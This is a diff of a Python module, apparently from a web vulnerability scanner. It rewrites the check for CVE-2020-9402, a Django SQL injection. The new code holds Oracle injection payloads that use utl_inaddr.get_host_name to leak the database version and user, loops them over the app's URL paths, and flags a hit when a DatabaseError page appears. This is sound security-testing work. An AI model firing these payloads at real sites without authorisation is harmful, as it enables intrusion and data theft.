@@ -1,63 +1,48 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
-from lib.tool import check
-from thirdparty import requests
+# from lib.tool import check
 
-def cve_2020_9402_scan(self, url):
+cve_2020_9402_payloads = [
+    {'path': '{URLCONF}/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1'},
+    {'path': '{URLCONF}/?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --'},
+    # {'path': '?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1'},
+    # {'path': '?q=0.05))) FROM "VULN_COLLECTION2"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --'},
+]
+
+def cve_2020_9402_scan(self, clients):
     ''' 该漏洞需要开发者使用JSONField/HStoreField, 可以控制查询集的字段名称; 
         Django的内置应用程序 Django-Admin 受到影响  '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'SQLinject'
-    vul_info['vul_id'] = 'CVE-2020-9402'
-    vul_info['vul_method'] = 'GET'
-    vul_info['headers'] = {}
+    client = clients.get('reqClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'SQLinject',
+        'vul_id': 'CVE-2020-9402',
+    }
+    
+    urlConfList = self.get_urlconf(client, vul_info)     # * 获取Django定义的URL路径
+    if not urlConfList:
+        return None
+    
+    for payload in cve_2020_9402_payloads:
+        for urlConf in urlConfList:
+            path = payload['path'].format(URLCONF=urlConf)
+            url = client.protocol_domain + '/'
 
-    # headers = self.headers.copy()
-    # headers.update(vul_info['headers'])
-
-    for payload in self.cve_2020_9402_payloads:
-        path = payload['path']
-        data = payload['data']
-        target = url + path
-
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            res = requests.get(
-                target, 
-                timeout=self.timeout, 
-                headers=self.headers,
-                data=data, 
-                proxies=self.proxies, 
-                verify=False
+            res = client.request(
+                'get',
+                url + path,
+                vul_info=vul_info
             )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
+            if res is None:
+                continue
 
-
-            # todo 判断
             if (('DatabaseError' in res.text) and ('Request information' in res.text)):
                 results = {
-                    'Target': target,
+                    'Target': res.request.url,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
+                    'Request': res
                 }
                 return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+    return None
